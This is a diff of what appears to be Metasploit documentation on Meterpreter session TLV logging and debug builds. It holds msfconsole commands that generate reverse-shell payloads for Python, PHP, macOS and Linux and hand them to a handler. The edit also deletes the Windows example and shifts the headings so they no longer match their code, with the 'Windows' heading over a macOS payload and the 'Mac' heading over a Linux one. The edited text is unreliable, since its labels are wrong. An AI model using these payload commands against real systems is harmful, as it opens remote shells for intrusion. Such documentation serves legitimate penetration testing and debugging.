@@ -4,7 +4,7 @@ This can be enabled for any Meterpreter session, and does not require a debug Me
 msf6 > setg SessionTlvLogging true
 SessionTlvLogging => true
 ```
-
+### Python payload generation with Meterpreter
 Example output:
 ```
 use payload/python/meterpreter_reverse_tcp
@@ -15,7 +15,7 @@ python3 shell.py
 ```
 
 ## Meterpreter debug builds
-### Python
+### PHP payload generation with Meterpreter
 
 ```
 use payload/php/meterpreter_reverse_http
@@ -25,16 +25,8 @@ to_handler
 php shell_http.php
 ```
 
-### PHP
 
-```
-use windows/x64/meterpreter_reverse_tcp
-generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/Windows/Temp/foo.txt'
-
-to_handler
-```
-
-### Windows
+### Windows payload generation with Meterpreter
 
 ```
 use osx/x64/meterpreter_reverse_tcp
@@ -43,7 +35,7 @@ generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='r
 to_handler
 ```
 
-### Mac
+### Mac payload generation with Meterpreter
 
 ```
 use linux/x64/meterpreter_reverse_tcp
